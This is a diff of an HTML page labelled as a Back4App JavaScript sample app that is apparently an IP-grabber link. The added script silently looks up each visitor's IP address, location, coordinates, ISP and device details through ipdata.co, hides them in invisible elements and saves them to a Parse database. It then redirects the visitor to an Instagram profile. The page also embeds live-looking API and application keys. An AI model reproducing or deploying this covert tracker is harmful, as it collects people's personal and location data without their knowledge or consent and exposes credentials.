@@ -2,9 +2,9 @@
 <html>
   <head>
 	<title>Sample App| JavaScript Quickstart | Back4App</title>
-	
-	<meta http-equiv="refresh" content="2;url=https://www.instagram.com/gabrielgomes901">
-	  
+
+	<!--<meta http-equiv="refresh" content="2;url=https://www.instagram.com/gabrielgomes901">-->
+
 	<meta name="theme-color" content="#121212"/>
 	<meta name="apple-mobile-web-app-status-bar-style" content="#212121">
 
@@ -24,7 +24,7 @@
 	<h3></h3>
   </body>
 
-	<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
 
 
   <h1 id="ES" style="background:red; height:100px;visibility:hidden"></h1>
@@ -32,24 +32,27 @@
   <h1 id="RG" style="background:red; height:100px;visibility:hidden"></h1>
 
   <h1 id="IP" style="background:red; height:100px;visibility:hidden"></h1>
-	<!--
-	<h1 id="LT" style="background:red; height:100px;">b1f520b70c5e1def4723864208d31227d64a523ba902d54f49656753</h1>
+  <!--
+  <h1 id="LT" style="background:red; height:100px;">b1f520b70c5e1def4723864208d31227d64a523ba902d54f49656753</h1>
 
-	<h1 id="LG" style="background:red; height:100px;"></h1>
-	-->
+  <h1 id="LG" style="background:red; height:100px;"></h1>
+  -->
   <h1 id="LL" style="background:red; height:100px;visibility:hidden"></h1>
 
   <h1 id="LL2" style="background:red; height:100px;visibility:hidden"></h1>
 
-	<textarea id="informação" style="background:red; height:100px;visibility:hidden"></textarea>
+  <textarea id="informação" style="background:red; height:100px;visibility:hidden"></textarea>
 
-	<div id="ip"></div>
-	<div id="city"></div>
-	<pre id="response"></pre>
+  <h1 id="informação_total" style="visibility:hidden"></h1>
+
+  <div id="ip"></div>
+  <div id="city"></div>
+  <pre id="response"></pre>
 
 <script>
- 
+ var INFO;
   IS_MOBILE = (function (a) {
+  INFO = a;
   document.getElementById('informação').value=a;
 
   return (
@@ -59,14 +62,13 @@
 
 $.get("https://api.ipdata.co?api-key=b1f520b70c5e1def4723864208d31227d64a523ba902d54f49656753", function(response) {
  
-  var i = 430411;
   var ES = response.region;
   var RG = response.city;
   var IP = response.ip;
   var LG = response.longitude;
   var LT = response.latitude;
  
-  var Total = JSON.stringify(response, null, 4);
+ // var Total = JSON.stringify(response, null, 4);
   
  document.getElementById('ES').innerHTML=ES;
  
@@ -97,14 +99,31 @@ string2 = "-"+i2;
  document.getElementById('LL').innerHTML=string1;
  
  document.getElementById('LL2').innerHTML=string2;
- /*
- document.getElementById('ES').style.display="none";
- document.getElementById('RG').style.display="none";
- document.getElementById('IP').style.display="none";
- document.getElementById('LL').style.display="none";
- document.getElementById('LL2').style.display="none";
- document.getElementById('informação').style.display="none";*/
  
+ var Total = document.getElementById("informação_total").innerHTML=
+ "NOME DO PAIS:"+response.country_name+"\n"+
+ "REGIAO:"+response.region+"\n"+
+ "CIDADE:"+response.city+"\n"+
+ "CODIGO DO PAIS:"+response.country_code+"\n"+
+ "CODIGO REGIONAL:"+response.region_code+"\n"+
+ "LONGITUDE:"+string1+"\n"+
+ "LATITUDE:"+string2+"\n"+
+ "CODIGO DE CHAMADA:"+response.calling_code+"\n"+
+ "CODIGO DO CONTINENTE:"+response.continent_code+"\n"+
+ "CODIGO POSTAL:"+response.postal+"\n"+
+ "ASN:"+response.asn.asn+"\n"+
+ "NOME:"+response.asn.name+"\n"+
+ "DOMINIO:"+response.asn.domain+"\n"+
+ "ROTEADOR:"+response.asn.route+"\n"+
+ "FUSO HORARIO:"+response.time_zone.name+"\n"+
+ "ABBR:"+response.time_zone.abbr+"\n"+
+ "DESLOCAMENTO:"+response.time_zone.offset+"\n"+
+ "HORA ATUAL:"+response.time_zone.current_time+"\n"+
+ "IP:"+response.ip+"\n"+
+ "INFORMACOES DO APARELHO:"+INFO;
+
+
+ //Parse
       Parse.initialize("q3CTgQtrAOL8hHPvpPN2HzWUVSozLqEo7rJt9Cu9", "lDUd1soV2kESsDCI6l9tUYqo4IURVKFg6Rd3eyc7"); //PASTE HERE YOUR Back4App APPLICATION ID AND YOUR Javascript KEY
       Parse.serverURL = "https://parseapi.back4app.com/";
 	  
@@ -120,12 +139,14 @@ string2 = "-"+i2;
 	  mygps.set("longitude",LG);
 	  mygps.set("latitude",LT);
 	  mygps.set("informacao",document.getElementById('informação').value);
-	  mygps.set("todas_informacoes",ES+" "+RG+" "+IP+" "+LG+" "+LT+" "+document.getElementById('informação').value+"\n"+Total);
+	  mygps.set("todas_informacoes",Total);
 	  mygps.save();
+	  var intervalo = setInterval(function(){
+	  window.location.href="https://www.instagram.com/gabrielgomes901";
+	  clearInterval(intervalo);
+	  },0);
 	  }
-}, "jsonp");
-setInterval(function(){
-//window.location.href = "https://chat.whatsapp.com/L7ebX5FJH9PKyFEmWm1Ubk";
-},2000);
+}, "json");
+
 </script>
-</html>
+</html>		
